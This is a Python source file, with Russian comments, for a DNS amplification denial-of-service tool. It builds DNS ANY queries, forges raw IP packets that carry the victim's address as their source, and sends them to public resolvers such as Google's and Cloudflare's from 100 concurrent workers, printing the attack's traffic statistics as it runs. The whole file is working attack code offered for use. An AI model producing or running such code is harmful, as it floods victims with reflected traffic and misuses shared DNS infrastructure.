# layers/amplification/dns_amp.py
import socket
import asyncio
import random
import struct
import time
from typing import List
from colorama import Fore, Style


class DNSAmplifier:
    """DNS Amplification атака"""
    
    # Публичные DNS серверы для амплификации
    DNS_SERVERS = [
        '8.8.8.8', '8.8.4.4',           # Google DNS
        '1.1.1.1', '1.0.0.1',           # Cloudflare
        '9.9.9.9', '149.112.112.112',   # Quad9
        '64.6.64.6', '64.6.65.6',       # Verisign
        '208.67.222.222', '208.67.220.220',  # OpenDNS
        '185.228.168.168',              # CleanBrowsing
        '76.76.19.19',                  # Alternate DNS
        '94.140.14.14', '94.140.15.15', # AdGuard
    ]
    
    # Домены с большими TXT записями
    LARGE_DOMAINS = [
        'ripe.net',
        'isc.org',
        'arin.net',
        'lacnic.net',
        'afrinic.net',
        'dns.google',
        f'{random.randint(1000000, 9999999)}.example.com'
    ]
    
    def __init__(self, target_ip: str, amplification_factor: int = 50, workers: int = 100):
        self.target_ip = target_ip
        self.amplification_factor = amplification_factor
        self.workers = workers
        
        self.sent_queries = 0
        self.estimated_amplified = 0
        self._running = False
        self._tasks = []
        
        # Кэш DNS серверов
        self.available_servers = self.DNS_SERVERS.copy()
    
    def craft_dns_query(self, domain: str, query_type: int = 255) -> bytes:
        """
        Создание DNS запроса (TYPE ANY = 255 для максимального ответа)
        
        Args:
            domain: Домен для запроса
            query_type: Тип запроса (16 = TXT, 255 = ANY)
        """
        # Transaction ID (случайный)
        transaction_id = random.randint(0, 65535)
        
        # DNS заголовок
        # QR=0 (запрос), OPCODE=0 (стандартный), AA=0, TC=0, RD=1 (рекурсивный)
        flags = 0x0100
        questions = 1
        answers = 0
        authority = 0
        additional = 0
        
        header = struct.pack('!HHHHHH',
            transaction_id,
            flags,
            questions,
            answers,
            authority,
            additional
        )
        
        # Кодируем домен в QNAME формат
        qname_parts = []
        for part in domain.encode().split(b'.'):
            qname_parts.append(bytes([len(part)]) + part)
        qname_parts.append(b'\x00')
        qname = b''.join(qname_parts)
        
        # QTYPE и QCLASS
        qtype = query_type  # ANY запрос
        qclass = 1         # IN класс
        
        question = qname + struct.pack('!HH', qtype, qclass)
        
        return header + question
    
    def get_spoofed_socket(self) -> socket.socket:
        """Создание raw socket для спуфинга IP (требует прав администратора)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except:
            # Fallback на обычный socket (без спуфинга)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            return sock
    
    def craft_spoofed_packet(self, dns_query: bytes, source_port: int) -> bytes:
        """Создание спуфированного IP пакета с DNS запросом"""
        # Простой IP заголовок (упрощенный)
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 20 + 8 + len(dns_query)  # IP + UDP + DNS
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(self.target_ip)  # Спуфинг: исходим от жертвы
        ip_daddr = socket.inet_aton(random.choice(self.available_servers))
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        # UDP заголовок
        udp_src = source_port
        udp_dst = 53
        udp_len = 8 + len(dns_query)
        udp_check = 0
        
        udp_header = struct.pack('!HHHH',
            udp_src,
            udp_dst,
            udp_len,
            udp_check
        )
        
        return ip_header + udp_header + dns_query
    
    async def amplification_worker(self, worker_id: int):
        """Воркер для отправки DNS запросов"""
        sock = None
        
        try:
            # Пытаемся создать raw socket для спуфинга
            try:
                sock = self.get_spoofed_socket()
                use_spoofing = True
            except PermissionError:
                # Без прав администратора используем обычные сокеты
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
                use_spoofing = False
                print(f"{Fore.YELLOW}⚠️  Worker {worker_id}: Running without IP spoofing (need root){Style.RESET_ALL}")
            
            source_port = random.randint(1024, 65535)
            
            while self._running:
                try:
                    # Выбираем случайный DNS сервер и домен
                    dns_server = random.choice(self.available_servers)
                    domain = random.choice(self.LARGE_DOMAINS)
                    
                    # Создаем DNS запрос
                    dns_query = self.craft_dns_query(domain)
                    
                    if use_spoofing:
                        # Создаем спуфированный пакет
                        packet = self.craft_spoofed_packet(dns_query, source_port)
                        sock.sendto(packet, (dns_server, 53))
                    else:
                        # Отправляем обычный UDP пакет
                        # Внимание: без спуфинга ответы придут к нам, а не к жертве
                        await asyncio.get_event_loop().sock_sendto(
                            sock, dns_query, (dns_server, 53)
                        )
                    
                    self.sent_queries += 1
                    self.estimated_amplified += self.amplification_factor
                    
                    # Вывод статистики
                    if self.sent_queries % 100 == 0:
                        elapsed = time.time() - getattr(self, '_start_time', time.time())
                        qps = int(self.sent_queries / elapsed) if elapsed > 0 else 0
                        estimated_mbps = (self.estimated_amplified * 512) / 1024 / 1024  # ~512 байт на ответ
                        
                        print(f"\r{Fore.WHITE}🌀 Queries: {self.sent_queries:,} | "
                              f"⚡ QPS: {qps:,} | "
                              f"📈 Est. Amplified: {self.estimated_amplified:,} packets | "
                              f"💾 ~{estimated_mbps:.1f} MB{Style.RESET_ALL}", end="")
                    
                    # Небольшая задержка
                    await asyncio.sleep(0.01)
                    
                except (BlockingIOError, socket.error):
                    await asyncio.sleep(0.001)
                    continue
                except Exception as e:
                    if self._running:
                        print(f"{Fore.RED}[DNS Worker {worker_id}] Error: {e}{Style.RESET_ALL}")
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            print(f"{Fore.RED}❌ DNS Worker {worker_id} failed: {e}{Style.RESET_ALL}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    async def start(self):
        """Запуск DNS амплификации"""
        self._running = True
        self._start_time = time.time()
        
        print(f"{Fore.CYAN}🚀 Starting DNS Amplification attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚠️  Note: IP spoofing requires root/admin privileges{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 Target: {self.target_ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 Amplification factor: ~{self.amplification_factor}x{Style.RESET_ALL}")
        
        # Создаем задачи для воркеров
        self._tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self.amplification_worker(i))
            self._tasks.append(task)
        
        # Ожидаем завершения
        try:
            await asyncio.gather(*self._tasks)
        except asyncio.CancelledError:
            pass
    
    def stop(self):
        """Остановка атаки"""
        self._running = False
        
        for task in self._tasks:
            task.cancel()
        
        print(f"\n{Fore.GREEN}✅ DNS Amplification stopped{Style.RESET_ALL}")
        print(f"📊 Queries sent: {self.sent_queries:,}")
        print(f"📈 Estimated amplified traffic: {self.estimated_amplified:,} packets")
        
        if self.sent_queries > 0:
            amplification_ratio = self.estimated_amplified / self.sent_queries
            print(f"🎯 Actual amplification: ~{amplification_ratio:.1f}x")